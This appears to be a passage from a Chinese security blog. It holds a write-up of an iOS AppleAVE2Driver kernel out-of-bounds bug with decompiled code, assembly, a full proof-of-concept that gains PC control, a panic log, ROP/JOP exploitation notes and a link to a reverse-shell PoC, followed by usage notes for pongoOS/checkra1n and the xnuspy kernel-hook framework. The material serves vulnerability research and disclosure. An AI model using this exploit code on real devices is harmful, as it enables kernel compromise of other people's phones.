<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">AVEClient</span>       struc ; (<span class="keyword">sizeof</span>=<span class="number">0x29AC8</span>, align=<span class="number">0x8</span>, mappedto_215)</span><br><span class="line">[...]</span><br><span class="line"><span class="number">00001</span>B60 statsMapBufferArray DCB <span class="number">200</span> dup(?)</span><br><span class="line"><span class="number">00001</span>C28 sessionSettings_block1 DCB ?</span><br><span class="line">[...]</span><br><span class="line"><span class="comment">// Copies from the IOSurface buffer to a buffer adjacent to the statsMapBufferArray</span></span><br><span class="line">memmove(&amp;currentClient-&gt;sessionSettings_block1, buffMgrKernAddr, <span class="number">0x630</span>LL);</span><br></pre></td></tr></table></figure>

<p>因此，通过在复制到<code>AVEClient</code>的<code>IOSurface</code>缓冲区中提供精心构建的数据，我们完全可以控制越界数组条目。</p>
<h3 id="控制PC"><a href="#控制PC" class="headerlink" title="控制PC"></a>控制PC</h3><p>现在，我们看一下<code>AppleAVE2Driver::DeleteMemoryInfo</code>函数原型，记住我们对<code>memInfo</code>对象具有完全控制权限：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 AppleAVE2Driver::DeleteMemoryInfo(AppleAVE2Driver *<span class="variable language_">this</span>, IOSurfaceBufferMngr **memInfo)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( memInfo )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *memInfo )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(*memInfo);</span><br><span class="line">      operator delete(v8);</span><br><span class="line">    &#125;</span><br><span class="line">    memset(memInfo, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">    result = <span class="number">0</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xE00002BC</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>IOSurfaceBufferMngr</code>的析构函数直接封装了一个静态的<code>IOSurfaceBufferMngr::RemoveBuffer</code>调用:</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IOSurfaceBufferMngr *IOSurfaceBufferMngr::~IOSurfaceBufferMngr(IOSurfaceBufferMngr *<span class="variable language_">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  IOSurfaceBufferMngr::RemoveBuffer(<span class="variable language_">this</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后<code>RemoveBuffer</code>调用<code>IOSurfaceBufferMngr::CompleteFence</code>，在本例中，汇编代码如下：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IOSurfaceBufferMngr::CompleteFence(IOSurfaceBufferMngr *<span class="variable language_">this</span>)</span><br><span class="line"></span><br><span class="line">                STP             X20, X19, [SP,#<span class="number">-0x10</span>+var_10]!</span><br><span class="line">                STP             X29, X30, [SP,#<span class="number">0x10</span>+var_s0]</span><br><span class="line">                ADD             X29, SP, #<span class="number">0x10</span></span><br><span class="line">                MOV             X19, X0                         <span class="comment">// x19 = x0 (controlled pointer)</span></span><br><span class="line">                LDR             X0, [X0,#<span class="number">0x58</span>]                  <span class="comment">// Loads x0-&gt;0x58</span></span><br><span class="line">                CBZ             X0, exit_stub                   <span class="comment">// Exits if the value is zero </span></span><br><span class="line">                LDRB            W8, [X19,#<span class="number">0x1E</span>]                 <span class="comment">// Loads some byte at x19-&gt;0x1e</span></span><br><span class="line">                CBNZ            W8, exit_stub                   <span class="comment">// Exits if the byte is non-zero</span></span><br><span class="line">                MOV             W1, #<span class="number">0</span></span><br><span class="line">                BL              IOFence::complete</span><br><span class="line">                LDR             X0, [X19,#<span class="number">0x58</span>]                 <span class="comment">// Loads x19-&gt;0x58</span></span><br><span class="line">                LDR             X8, [X0]                        <span class="comment">// Loads x0-&gt;0x0</span></span><br><span class="line">                LDR             X8, [X8,#<span class="number">0x28</span>]                  <span class="comment">// Loads function pointer x8-&gt;0x28</span></span><br><span class="line">                BLR             X8                              <span class="comment">// Branches to fptr, giving arbitrary PC control</span></span><br><span class="line">                STR             XZR, [X19,#<span class="number">0x58</span>]</span><br><span class="line"></span><br><span class="line">exit_stub</span><br><span class="line">                LDP             X29, X30, [SP,#<span class="number">0x10</span>+var_s0]</span><br><span class="line">                LDP             X20, X19, [SP+<span class="number">0x10</span>+var_10],#<span class="number">0x20</span></span><br><span class="line">                RET</span><br></pre></td></tr></table></figure>

<p>本质上，通过创建一个<code>userland</code>共享缓冲区，可以触发一个越界访问，这将直接在关闭<code>userclient</code>时提供任意PC控制。</p>
<p>下面是这个漏洞的PoC，它将使设备崩溃，并导致取消对地址<code>0x4141414142424242</code>的引用:</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> kernel_bug_poc(io_connect_t ioconn, io_connect_t surface_ioconn)</span><br><span class="line">&#123;</span><br><span class="line">    kern_return_t ret;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> open_inputStruct[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> open_outputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        size_t open_outputStruct_size = <span class="keyword">sizeof</span>(open_outputStruct);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AppleAVE2UserClient::_my_open</span></span><br><span class="line">        ret = IOConnectCallStructMethod(ioconn, </span><br><span class="line">                                        <span class="number">0</span>, </span><br><span class="line">                                        open_inputStruct, </span><br><span class="line">                                        <span class="keyword">sizeof</span>(open_inputStruct), </span><br><span class="line">                                        open_outputStruct, </span><br><span class="line">                                        &amp;open_outputStruct_size);</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;my_open: %x %s&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create an IOSurface using the IOSurface client owned by MIDIServer</span></span><br><span class="line">    <span class="comment">// Address &amp; size of the shared mapping created by IOSurface and</span></span><br><span class="line">    <span class="comment">// returned in the output struct at offsets 0x0 and 0x1c respectively</span></span><br><span class="line">    uint64_t surface_map_addr = <span class="number">0x0</span>;</span><br><span class="line">    uint32_t surface_map_size = <span class="number">0x0</span>;</span><br><span class="line">    uint32_t surface_id = IOSurfaceRootUserClient_CreateSurface(surface_ioconn, &amp;surface_map_addr, &amp;surface_map_size);</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;Got Surface ID: %d&quot;</span>, surface_id);</span><br><span class="line"></span><br><span class="line">    uintptr_t surface_data = malloc(surface_map_size);</span><br><span class="line">    bzero((<span class="type">void</span> *)surface_data, surface_map_size);</span><br><span class="line"></span><br><span class="line">    *(uint64_t *)(surface_data + <span class="number">0x0</span>) = <span class="number">0x4141414142424242</span>;     <span class="comment">// First pointer to memory containing function pointer</span></span><br><span class="line">                                                                <span class="comment">// This field is the start of the block adjacent to the stats array</span></span><br><span class="line">    *(uint32_t *)(surface_data + <span class="number">0x3420</span>) = <span class="number">6</span>;                   <span class="comment">// `memoryInfoCnt2` field, gives 1 OOB access</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sends the data to MIDIServer to be written onto the IOSurface</span></span><br><span class="line">    <span class="comment">// The MIDIServer ROP chain hangs on the following call:</span></span><br><span class="line">    <span class="comment">// vm_read_overwrite(ourtask, clientbuf, surface1_map_size, surface1_map_addr, ...)</span></span><br><span class="line">    send_overwriting_iosurface_map(surface_data, surface_map_size, surface_map_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Waits for a message back from MIDIServer, sent by the ROP chain</span></span><br><span class="line">    <span class="comment">// Notifies us that the vm_read_overwrite call completed  </span></span><br><span class="line">    reply_notify_completion();</span><br><span class="line"></span><br><span class="line">    free(surface_data);</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Write the OOB count value to the `currentClient` object, and write our adjacent data</span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> setSessionSettings_inputStruct[<span class="number">0x108</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> setSessionSettings_outputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        size_t setSessionSettings_outputStruct_size = <span class="keyword">sizeof</span>(setSessionSettings_outputStruct);</span><br><span class="line"></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0x04</span>) = surface_id; <span class="comment">// FrameQueueSurfaceId</span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0x08</span>) = surface_id; <span class="comment">// InitInfoSurfaceId, vulnerable IOSurface mapping </span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0x0c</span>) = surface_id; <span class="comment">// ParameterSetsBuffer</span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0xd0</span>) = surface_id; <span class="comment">// codedHeaderCSID &amp; codedHeaderBuffer [0]</span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0xd4</span>) = surface_id; <span class="comment">// codedHeaderCSID &amp; codedHeaderBuffer [1]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// AppleAVE2UserClient::_SetSessionSettings </span></span><br><span class="line">        ret = IOConnectCallStructMethod(ioconn, </span><br><span class="line">                                        <span class="number">7</span>, </span><br><span class="line">                                        setSessionSettings_inputStruct, </span><br><span class="line">                                        <span class="keyword">sizeof</span>(setSessionSettings_inputStruct), </span><br><span class="line">                                        setSessionSettings_outputStruct, </span><br><span class="line">                                        &amp;setSessionSettings_outputStruct_size);</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;SetSessionSettings: %x %s&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Trigger the bug </span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> close_inputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> close_outputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        size_t close_outputStruct_size = <span class="keyword">sizeof</span>(close_outputStruct);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AppleAVE2UserClient::_my_close </span></span><br><span class="line">        ret = IOConnectCallStructMethod(ioconn, </span><br><span class="line">                                        <span class="number">1</span>, </span><br><span class="line">                                        close_inputStruct, </span><br><span class="line">                                        <span class="keyword">sizeof</span>(close_inputStruct), </span><br><span class="line">                                        close_outputStruct, </span><br><span class="line">                                        &amp;close_outputStruct_size);</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;my_close: %x %s&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>log：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">panic(cpu <span class="number">5</span> caller <span class="number">0xfffffff007205df4</span>): Kernel data abort. (saved state: <span class="number">0xffffffe03cafaf40</span>)</span><br><span class="line">      x0: <span class="number">0x4141414142424242</span>  x1:  <span class="number">0xffffffe02cb09c28</span>  x2:  <span class="number">0x0000000000000000</span>  x3:  <span class="number">0xffffffe02cb09c28</span></span><br><span class="line">      x4: <span class="number">0x0000000000000000</span>  x5:  <span class="number">0x0000000000000000</span>  x6:  <span class="number">0xfffffff00f35bb54</span>  x7:  <span class="number">0x0000000000000000</span></span><br><span class="line">      x8: <span class="number">0x0000000000000006</span>  x9:  <span class="number">0x0000000000000006</span>  x10: <span class="number">0x0000000000000001</span>  x11: <span class="number">0x0000000000080022</span></span><br><span class="line">      x12: <span class="number">0x0000000000000022</span> x13: <span class="number">0xffffffe00094bc08</span>  x14: <span class="number">0x0000000000080023</span>  x15: <span class="number">0x0000000000006903</span></span><br><span class="line">      x16: <span class="number">0xfffffff00ee71740</span> x17: <span class="number">0x0000000000000000</span>  x18: <span class="number">0xfffffff00ee79000</span>  x19: <span class="number">0x4141414142424242</span></span><br><span class="line">      x20: <span class="number">0xffffffe02cb08000</span> x21: <span class="number">0x0000000000000000</span>  x22: <span class="number">0xffffffe02cb09c28</span>  x23: <span class="number">0x0000000000000005</span></span><br><span class="line">      x24: <span class="number">0xffffffe02cb2f748</span> x25: <span class="number">0xffffffe02cb0d034</span>  x26: <span class="number">0x0000000000000050</span>  x27: <span class="number">0xffffffe004929218</span></span><br><span class="line">      x28: <span class="number">0x0000000000000000</span> fp:  <span class="number">0xffffffe03cafb2a0</span>  lr:  <span class="number">0xfffffff0069397e8</span>  sp:  <span class="number">0xffffffe03cafb290</span></span><br><span class="line">      pc:  <span class="number">0xfffffff0069398dc</span> cpsr: <span class="number">0x80400304</span>         esr: <span class="number">0x96000004</span>          far: <span class="number">0x414141414242429a</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>pc</code>对齐是在<code>x0-&gt;0x58</code>指令之前的分支:</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xFFFFFFF0069398CC</span> IOSurfaceBufferMngr::CompleteFence</span><br><span class="line"><span class="number">0xFFFFFFF0069398CC</span></span><br><span class="line"><span class="number">0xFFFFFFF0069398CC</span>                 STP             X20, X19, [SP,#<span class="number">-0x10</span>+var_10]!</span><br><span class="line"><span class="number">0xFFFFFFF0069398D0</span>                 STP             X29, X30, [SP,#<span class="number">0x10</span>+var_s0]</span><br><span class="line"><span class="number">0xFFFFFFF0069398D4</span>                 ADD             X29, SP, #<span class="number">0x10</span></span><br><span class="line"><span class="number">0xFFFFFFF0069398D8</span>                 MOV             X19, X0</span><br><span class="line"><span class="number">0xFFFFFFF0069398DC</span>                 LDR             X0, [X0,#<span class="number">0x58</span>]                 <span class="comment">// Faults here </span></span><br><span class="line"><span class="number">0xFFFFFFF0069398E0</span>                 CBZ             X0, loc_FFFFFFF006939908</span><br><span class="line"><span class="number">0xFFFFFFF0069398E4</span>                 LDRB            W8, [X19,#<span class="number">0x1E</span>]</span><br><span class="line"><span class="number">0xFFFFFFF0069398E8</span>                 CBNZ            W8, loc_FFFFFFF006939908</span><br><span class="line"><span class="number">0xFFFFFFF0069398EC</span>                 MOV             W1, #<span class="number">0</span></span><br><span class="line"><span class="number">0xFFFFFFF0069398F0</span>                 BL              IOFence__complete</span><br><span class="line"><span class="number">0xFFFFFFF0069398F4</span>                 LDR             X0, [X19,#<span class="number">0x58</span>]</span><br><span class="line"><span class="number">0xFFFFFFF0069398F8</span>                 LDR             X8, [X0]</span><br><span class="line"><span class="number">0xFFFFFFF0069398FC</span>                 LDR             X8, [X8,#<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0xFFFFFFF006939900</span>                 BLR             X8</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>一旦逃逸了沙盒，利用这个漏洞就非常简单。</p>
<p>PoC中的代码也可用于EXP，但是<code>SetSessionSettings</code>缓冲区(<code>0x4141414142424242</code>)中提供的值必须指向可控的内核缓冲区，可以从该缓冲区加载函数指针。另外一个堆信息泄漏的漏洞可以用于稳定性保证。在kASLR失败的情况下，还可以根据每个设备推测堆的位置:在堆内存高地址测试下，大量的分配很可能会在相同的内存范围(<code>0xffffffffe1xxxxxxxx</code>)。</p>
<p>因为这个漏洞可以让我们控制PC，所以它可以通过ROP或JOP进行利用。虽然不一定适用于有PAC的A12或更新版本的设备，但非A12&#x2F;A13是支持我们沙盒逃逸，还要注意，在构建ROP&#x2F;JOP链时，可控内核缓冲区的地址在x19内，另一个可控指针在x0内，可以用作stack pivot或暂存内存空间。</p>
<p>反弹shell <a target="_blank" rel="noopener" href="https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%204066/poc">POC</a>。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195619">https://www.anquanke.com/post/id/195619</a></p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-12T02:26:14.000Z" title="2021/12/12 10:26:14">2021-12-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-12-12T08:51:43.779Z" title="2021/12/12 16:51:43">2021-12-12</time></span><span class="level-item">2 minutes read (About 253 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/12/pongoOS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">pongoOS学习记录</a></p><div class="content"><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>pongoOS是一个为Apple打造的预启动执行环境，一个简易操作系统。</p>
<blockquote>
<p>⚠️</p>
<p>由于checkra1n是利用checkm8漏洞来实现pongoOS的，所以只支持A7-A11。</p>
</blockquote>
<p>checkra1n利用checkm8漏洞将pongoOS注入到iBoot中，pongoOS通过内存Hook劫持iBoot，在iBoot末尾启动自身，pongoOS执行后加载KPF(Kernel Patch Finder)内核模块。</p>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>源码链接：<a target="_blank" rel="noopener" href="https://github.com/checkra1n/pongoOS">https://github.com/checkra1n/pongoOS</a></p>
<p>Mac上只需要<code>make all</code>即可。</p>
<p>主要生成以下4个产物：</p>
<ul>
<li>Pongo，PongoOS的Mach-O文件</li>
<li>Pongo.bin，与上面相同，但作为可以跳转到的裸机二进制文件</li>
<li>checkra1n-kpf-pongo， checkra1n 内核补丁查找器，作为 Pongo 模块 (Mach-O&#x2F;kext)</li>
<li>PongoConsolidated.bin， PongoOS 和 KPF 合并成一个二进制文件</li>
</ul>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>USB连接设备</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkra1n -k Pongo.bin                  <span class="comment"># Boots to Pongo shell, KPF not available</span></span><br><span class="line">checkra1n -k PongoConsolidated.bin      <span class="comment"># Auto-runs KPF and boots to XNU</span></span><br><span class="line">checkra1n -k PongoConsolidated.bin -p   <span class="comment"># Loads KPF, but boots to Pongo shell</span></span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-11T15:46:10.000Z" title="2021/12/11 23:46:10">2021-12-11</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-12-13T12:01:37.800Z" title="2021/12/13 20:01:37">2021-12-13</time></span><span class="level-item">7 minutes read (About 1124 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/11/iOS%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0Hook%E6%A1%86%E6%9E%B6-xnuspy/">iOS内核函数Hook框架 - xnuspy</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>xnuspy 是一个 pongoOS 模块，它安装了一个新的系统调用<code>xnuspy_ctl</code>，允许从用户空间Hook内核函数。</p>
<p><strong>适用范围：在 checkra1n 0.12.2 及更高版本上支持 iOS 13.x、iOS 14.x 和 iOS 15.x，不支持TV 4K 设备。</strong></p>
<h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>brew install libusb</p>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>make即可</p>
<p>一些编译可能有用的选项：</p>
<ul>
<li><pre><code class="bash">XNUSPY_DEBUG=1 #将 xnuspy 的调试输出发送到内核日志(kprintf)
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```bash</span><br><span class="line">  XNUSPY_SERIAL=1 #将调试输出从 xnuspy 发送到IOLog</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><pre><code class="bash">XNUSPY_LEAKED_PAGE_LIMIT=n #设置 xnuspy 在其垃圾收集线程开始释放它们之前允许泄漏的页数。默认为64。更多信息可以在[Debugging Kernel Panics下找到
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```bash</span><br><span class="line">  XNUSPY_TRAMP_PAGES=n #设置 xnuspy 为其蹦床结构保留的页数。默认值为 1。更多信息可以在limits下找到</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p><code>XNUSPY_DEBUG</code>并且<code>XNUSPY_SERIAL</code>不相互依赖。</p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>使用checkra1n将设备引导至 pongo shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/checkra1n.app/Contents/MacOS/checkra1n -p</span><br></pre></td></tr></table></figure>

<p>在xnuspy目录下执行 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loader/loader module/xnuspy</span><br></pre></td></tr></table></figure>

<p>几秒钟后你的设备就会启动。</p>
<h1 id="xnuspy-ctl"><a href="#xnuspy-ctl" class="headerlink" title="xnuspy_ctl"></a>xnuspy_ctl</h1><p>xnuspy 将修补一个 enosys 系统调用，以指向 xnuspy_ctl_tramp。这是一个小的跳板，它将编译后的 xnuspy_ctl 代码标记为可执行代码，并将分支指向它。你可以在module&#x2F;el1&#x2F;xnuspy_ctl&#x2F;xnuspy_ctl.c中找到xnuspy_ctl的实现，在example目录中找到例子。</p>
<p>include&#x2F;xnuspy&#x2F;里面是xnuspy_ctl.h，这个头文件定义了xnuspy_ctl的常量。它被包含在所有Hook内核函数的程序中。</p>
<p>你可以使用 sysctlbyname 来了解哪个系统调用被修补了。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> oldlen = <span class="built_in">sizeof</span>(<span class="type">long</span>);</span><br><span class="line"><span class="type">long</span> SYS_xnuspy_ctl = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sysctlbyname</span>(<span class="string">&quot;kern.xnuspy_ctl_callnum&quot;</span>, &amp;SYS_xnuspy_ctl, &amp;oldlen, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这个系统调用需要四个参数，flavor、arg1、arg2和arg3，arg1、arg2和arg3的含义取决于flavor。flavor可以是</p>
<ul>
<li><p>XNUSPY_CHECK_IF_PATCHED</p>
<p>检查 xnuspy_ctl 是否存在，返回999，其他参数的值被忽略。</p>
</li>
<li><p>XNUSPY_INSTALL_HOOK</p>
<p>匹配MSHookFunction的API。 arg1是想钩住的内核函数的UNSLID地址。arg2是一个指向ABI兼容的替换函数的指针。 arg3是一个指针，用于xnuspy_ctl复制出代表原始内核函数的蹦床的地址。如果不打算调用原始函数，这个指针可以是NULL。</p>
</li>
<li><p>XNUSPY_REGISTER_DEATH_CALLBACK</p>
<p>注册一个可选的 “死亡回调”，当钩子程序退出时，xnuspy会调用这个函数，清理在内核钩子上创建的任何东西。如果创建了内核线程，可以在这个函数中终止它们。</p>
<p>回调不是异步调用的，所以如果主线程阻塞，就会阻止xnuspy的垃圾回收线程执行。</p>
<p>arg1是一个指向回调函数的指针。其他参数的值被忽略。</p>
</li>
<li><p>XNUSPY_CALL_HOOKME</p>
<p>hookme是一个小的汇编存根，xnuspy通过xnuspy缓存导出以提供Hook。用这种方式调用 xnuspy_ctl 会导致 hookme 被调用，提供了一种方法来轻松获得内核代码的执行，而不用去钩住一个实际的内核函数。</p>
<p>arg1是一个参数，当它被调用时将被传递给hookme。这个参数可以是NULL。</p>
</li>
<li><p>XNUSPY_CACHE_READ</p>
<p>从 xnuspy 缓存中读取的方法。它包含了许多有用的东西，如kprintf、current_proc、kernel_thread_start、一些libc函数和内核滑动。关于缓存ID的完整列表，请查看example&#x2F;xnuspy_ctl.h。</p>
<p>arg1是xnuspy_ctl.h中定义的缓存ID之一，arg2是一个指针，用于xnuspy_ctl复制出请求的地址或值。其他参数的值被忽略。</p>
</li>
<li><p>XNUSPY_KREAD</p>
<p>在没有tfp0的情况下从用户空间读取内核内存。</p>
<p>arg1是一个内核虚拟地址，arg2是用户空间缓冲区的地址，arg3是该用户空间缓冲区的大小。</p>
</li>
<li><p>XNUSPY_KWRITE</p>
<p>从用户空间写到内核内存，而不用tfp0。</p>
<p>arg1是一个内核虚拟地址，arg2是一个用户空间缓冲区的地址，arg3是该用户空间缓冲区的大小。</p>
</li>
<li><p>XNUSPY_GET_CURRENT_THREAD</p>
<p>为用户空间提供了调用线程的内核地址。</p>
<p>arg1是一个指针，用于xnuspy_ctl复制出current_thread的返回值。其他参数的值被忽略。</p>
</li>
</ul>
